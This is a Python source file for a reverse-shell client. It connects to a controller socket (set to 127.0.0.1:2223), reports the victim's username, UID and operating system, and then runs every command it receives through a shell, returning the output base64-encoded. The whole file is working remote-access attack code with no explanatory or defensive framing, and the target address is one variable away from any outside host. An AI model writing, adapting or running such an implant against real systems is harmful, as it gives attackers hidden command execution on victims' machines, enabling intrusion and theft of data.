import base64
import os
import platform
import pwd
import socket
import subprocess
import time


def session_handler(sock, target_ip, target_port):
    print(f'[+] Connecting to {target_ip}.')
    sock.connect((target_ip, target_port))

    outbound(sock, pwd.getpwuid(os.getuid())[0])
    outbound(sock, os.getuid())
    time.sleep(1)
    op_sys = f'{platform.uname()[0]} {platform.uname()[2]}'
    outbound(sock, op_sys)
    print(f'[+] Connected to {target_ip}.')

    while True:
        message = inbound(sock)
        print(f'[+] Message received - {message}')

        if message == 'exit':
            print('[-] The server has terminated the session.')
            break

        if message == 'persist' or message == 'background' or message == 'help':
            continue

        if message.split(" ")[0] == 'cd':
            change_directory(sock, message)
            continue

        execute_command(sock, message)

    sock.close()


def execute_command(sock, message):
    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()
    outbound(sock, output.decode())


def change_directory(sock, message):
    try:
        directory = str(message.split(" ")[1])
        os.chdir(directory)
        cur_dir = os.getcwd()
        print(f'[+] Changed to {cur_dir}')
        outbound(sock, cur_dir)
    except FileNotFoundError:
        outbound(sock, 'Invalid directory.  Try again.')


def inbound(sock):
    print('[+] Awaiting response...')
    message = sock.recv(1024).decode()
    message = base64.b64decode(message).decode().strip()
    return message


def outbound(sock, message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf-8'))
    sock.send(response)


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = '127.0.0.1'
    host_port = 2223
    try:
        session_handler(sock, host_ip, host_port)
    except Exception as e:
        print(e)
    finally:
        sock.close()


if __name__ == '__main__':
    main()
